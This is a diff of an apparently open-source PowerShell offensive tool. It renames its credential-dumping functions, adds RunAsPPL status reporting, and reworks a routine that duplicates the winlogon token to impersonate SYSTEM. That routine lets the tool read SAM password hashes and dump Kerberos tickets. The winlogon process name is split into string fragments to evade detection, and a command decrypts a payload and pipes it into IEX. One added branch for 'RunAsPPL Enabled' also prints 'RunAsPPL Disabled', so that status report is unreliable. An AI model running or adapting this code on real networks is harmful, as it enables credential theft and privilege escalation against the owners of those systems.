@@ -2793,13 +2793,13 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
             }
 
             $WMI_Extend = $True
-            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-KerbDump -Monitor $MonitorTime"
+            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-DumpKerberos -Monitor $MonitorTime"
             Write-Host "- " -ForegroundColor "Yellow" -NoNewline
             Write-Host "Ticket monitoring has started. Please be patient for results to return to the console"
         }
         else {
 
-            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-KerbDump"
+            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-DumpKerberos"
 
         }
     }
@@ -3489,6 +3489,31 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                             -OSLength $OSLength
                         Continue
                     }
+
+                    elseif ($result -eq "RunAsPPL Disabled") {
+                        $Global:SuccessCount++
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
+                            -OS $($runspace.OS) `
+                            -statusColor "Green" `
+                            -statusSymbol "[+] " `
+                            -statusText "RunAsPPL Disabled" `
+                            -NameLength $NameLength `
+                            -OSLength $OSLength
+                        Continue
+                    }
+
+                    elseif ($result -eq "RunAsPPL Enabled") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
+                            -OS $($runspace.OS) `
+                            -statusColor "Red" `
+                            -statusSymbol "[-] " `
+                            -statusText "RunAsPPL Disabled" `
+                            -NameLength $NameLength `
+                            -OSLength $OSLength
+                        Continue
+                    }
+
                     elseif ($result -eq "Successful Connection PME") {
                         $Global:SuccessCount++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
@@ -3929,6 +3954,31 @@ while (`$true) {
                             -OSLength $OSLength
                         continue
                     }
+
+                    elseif ($result -eq "RunAsPPL Disabled") {
+                        $Global:SuccessCount++
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
+                            -OS $($runspace.OS) `
+                            -statusColor "Green" `
+                            -statusSymbol "[+] " `
+                            -statusText "RunAsPPL Disabled" `
+                            -NameLength $NameLength `
+                            -OSLength $OSLength
+                        Continue
+                    }
+
+                    elseif ($result -eq "RunAsPPL Enabled") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
+                            -OS $($runspace.OS) `
+                            -statusColor "Red" `
+                            -statusSymbol "[-] " `
+                            -statusText "RunAsPPL Disabled" `
+                            -NameLength $NameLength `
+                            -OSLength $OSLength
+                        Continue
+                    }
+
                     elseif ($result -eq "Successful Connection PME") {
                         $Global:SuccessCount++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
@@ -4315,6 +4365,31 @@ while (`$true) {
                             -OSLength $OSLength
                         Continue
                     }
+
+                    elseif ($result -eq "RunAsPPL Disabled") {
+                        $Global:SuccessCount++
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
+                            -OS $($runspace.OS) `
+                            -statusColor "Green" `
+                            -statusSymbol "[+] " `
+                            -statusText "RunAsPPL Disabled" `
+                            -NameLength $NameLength `
+                            -OSLength $OSLength
+                        Continue
+                    }
+
+                    elseif ($result -eq "RunAsPPL Enabled") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
+                            -OS $($runspace.OS) `
+                            -statusColor "Red" `
+                            -statusSymbol "[-] " `
+                            -statusText "RunAsPPL Disabled" `
+                            -NameLength $NameLength `
+                            -OSLength $OSLength
+                        Continue
+                    }
+
                     elseif ($result -eq "Successful Connection PME") {
                         $Global:SuccessCount++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
@@ -5510,6 +5585,31 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                             -OSLength $OSLength
                         continue
                     }
+
+                    elseif ($result -eq "RunAsPPL Disabled") {
+                        $Global:SuccessCount++
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
+                            -OS $($runspace.OS) `
+                            -statusColor "Green" `
+                            -statusSymbol "[+] " `
+                            -statusText "RunAsPPL Disabled" `
+                            -NameLength $NameLength `
+                            -OSLength $OSLength
+                        Continue
+                    }
+
+                    elseif ($result -eq "RunAsPPL Enabled") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
+                            -OS $($runspace.OS) `
+                            -statusColor "Red" `
+                            -statusSymbol "[-] " `
+                            -statusText "RunAsPPL Disabled" `
+                            -NameLength $NameLength `
+                            -OSLength $OSLength
+                        Continue
+                    }
+
                     elseif ($result -eq "Successful Connection PME") {
                         $Global:SuccessCount++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
@@ -10582,14 +10682,16 @@ Check_Virtual
 
 $Global:LocalPPLCheck = @'
 
-    $PPLQuery =  try {Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" -ErrorAction "SilentlyContinue"} Catch { Write-Output "RunAsPPL Disabled" }
-if ($PPLQuery.RunAsPPL -eq 1){
-    
-    Write-Output "RunAsPPL Enabled"
+$PPLQuery = try {
+    Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" -ErrorAction "SilentlyContinue"
+} Catch { 
+    [string] "RunAsPPL Disabled"
+}
 
-} Else {
-
-    Write-Output "RunAsPPL Disabled"
+if ($PPLQuery.RunAsPPL -eq 1) {
+    [string] "RunAsPPL Enabled"
+} else {
+    [string] "RunAsPPL Disabled"
 }
 
 '@
@@ -10600,7 +10702,7 @@ if ($PPLQuery.RunAsPPL -eq 1){
 
 # Highly compressed revision of this script: https://github.com/The-Viper-One/PME-Scripts/blob/main/DumpSAM.ps1
 $Global:LocalSAM = @'
-function Invoke-SAMDump {
+function Invoke-DumpSAM {
 
     function Invoke-FunctionLookup {
         Param (
@@ -10716,34 +10818,35 @@ function Invoke-SAMDump {
     $FnRegQueryInfoKey = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $A2 -functionName $F7), (Invoke-GetDelegate @([Int32], [Text.StringBuilder], [Int32].MakeByRefType(), [Int32], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType(), [IntPtr]) ([Int32])));
     $FnRegCloseKey = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $A2 -functionName $F8), (Invoke-GetDelegate @([Int32]) ([Int32])));
 
-    function Invoke-Impersonate {
-       
-        $P1 = "Wi" + "N"
-        $P2 = "lO" + "gO" + "n"
-        $P3 = $P1 + $P2
-        
-        $wlgProcessId = (Get-Process $P3 | Select-Object -First 1 -ExpandProperty Id)
-        $wlgProcHandle = $FnOpenProcess.Invoke(0x400, $true, [Int32]$wlgProcessId)
-        if ($wlgProcHandle -eq [IntPtr]::Zero) { return $false }
-        $wlgProcTokenHandle = [IntPtr]::Zero
-        
-        if (-not $FnOpenProcessToken.Invoke($wlgProcHandle, 0x0E, [ref]$wlgProcTokenHandle)) { return $false }
-        
-        $dupTokenHandle = [IntPtr]::Zero
-        if (-not $FnDuplicateTokenEx.Invoke($wlgProcTokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupTokenHandle)) { return $false }
-        
-        try {
-            if (-not $FnImpersonateLoggedOnUser.Invoke($dupTokenHandle)) { return $false }
-            
-            $curUsrIdent = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-            
-            if ($curUsrIdent -match "NT AUTHORITY\\.*") { return $true }
-            else { return $false }
-        }
-        catch { return $false }
-        return $false
-    }
+        function Invoke-Impersonate {
 
+    $CurrentUserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value    
+    if ($currentUserSid -eq "S-1-5-18") { return }
+    
+    $P1 = "Wi" + "N"
+    $P2 = "lO" + "gO" + "n"
+    $P3 = $P1 + $P2
+    $wlgProcessId = (Get-Process $P3 | Select-Object -First 1 -ExpandProperty Id)
+    $wlgProcHandle = $FnOpenProcess.Invoke(0x400, $true, [Int32]$wlgProcessId)
+    if ($wlgProcHandle -eq [IntPtr]::Zero) { return $false }
+    
+    $wlgProcTokenHandle = [IntPtr]::Zero
+    if (-not $FnOpenProcessToken.Invoke($wlgProcHandle, 0x0E, [ref]$wlgProcTokenHandle)) { return $false }
+    
+    $dupTokenHandle = [IntPtr]::Zero
+    if (-not $FnDuplicateTokenEx.Invoke($wlgProcTokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupTokenHandle)) { return $false }
+    
+    try {
+        
+        if (-not $FnImpersonateLoggedOnUser.Invoke($dupTokenHandle)) { return $false }
+        if ($currentUserSid -eq "S-1-5-18") { return } else { return $false }
+    
+        }
+    
+    catch { return $false }
+    
+    return $false
+}
 
     function Get-NTLM {
         Get-ChildItem "HKLM:SAM\SAM\Domains\Account\Users" |
@@ -10930,7 +11033,7 @@ function Invoke-SAMDump {
 
     Invoke-Impersonate > $null
     Get-NTLM
-} Invoke-SamDump
+} Invoke-DumpSAM
 '@
 
 ################################################################################################################
@@ -10939,7 +11042,7 @@ function Invoke-SAMDump {
 
 # Highly compressed revision of this script: https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1
 $Global:LocalKerbDump = @'
-Function Invoke-KerbDump {
+Function Invoke-DumpKerberos {
     param ([Switch]$TGT, [Int]$Monitor)
     
     $ntAuthorityRegexPattern = "NT.AUT.*\\"
@@ -11086,45 +11189,34 @@ Function Invoke-KerbDump {
     $FnImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dX4 -functionName $dF13), (Invoke-GetDelegate @([IntPtr]) ([bool])));
    
     function Invoke-Impersonate {
+
+    $CurrentUserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value    
+    if ($currentUserSid -eq "S-1-5-18") { return }
+    
+    $P1 = "Wi" + "N"
+    $P2 = "lO" + "gO" + "n"
+    $P3 = $P1 + $P2
+    $wlgProcessId = (Get-Process $P3 | Select-Object -First 1 -ExpandProperty Id)
+    $wlgProcHandle = $FnOpenProcess.Invoke(0x400, $true, [Int32]$wlgProcessId)
+    if ($wlgProcHandle -eq [IntPtr]::Zero) { return $false }
+    
+    $wlgProcTokenHandle = [IntPtr]::Zero
+    if (-not $FnOpenProcessToken.Invoke($wlgProcHandle, 0x0E, [ref]$wlgProcTokenHandle)) { return $false }
+    
+    $dupTokenHandle = [IntPtr]::Zero
+    if (-not $FnDuplicateTokenEx.Invoke($wlgProcTokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupTokenHandle)) { return $false }
+    
+    try {
         
-        $P1 = "Wi" + "N"
-        $P2 = "lO" + "gO" + "n"
-        $P3 = $P1 + $P2
-        $WinLogonProcessId = (Get-Process $P3 | Select-Object -First 1 -ExpandProperty Id)
-        $winlogonProcessHandle = $FnOpenProcess.Invoke(0x400, $true, [Int32]$winlogonProcessId)
-        if ($winlogonProcessHandle -eq [IntPtr]::Zero) {
-            return $false
+        if (-not $FnImpersonateLoggedOnUser.Invoke($dupTokenHandle)) { return $false }
+        if ($currentUserSid -eq "S-1-5-18") { return } else { return $false }
+    
         }
-        
-        $winlogonProcessTokenHandle = [IntPtr]::Zero
-        if (-not $FnOpenProcessToken.Invoke($winlogonProcessHandle, 0x0E, [ref]$winlogonProcessTokenHandle)) {
-            return $false
-        }
-        
-        $duplicatedToken = [IntPtr]::Zero
-        if (-not $FnDuplicateTokenEx.Invoke($winlogonProcessTokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$duplicatedToken)) {
-            return $false
-        }
-        
-        try {
-            
-            if (-not $FnImpersonateLoggedOnUser.Invoke($duplicatedToken)) {
-                return $false
-            }
-            
-            $currentUserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-            if ($currentUserIdentity -match "NT AUTHORITY\\.*") {
-                return $true
-            }
-            else {
-                return $false
-            }
-        }
-        catch {
-            return $false
-        }
-        return $false
-    }
+    
+    catch { return $false }
+    
+    return $false
+}
     
     Function LsaRegisterLogonProcess {
         
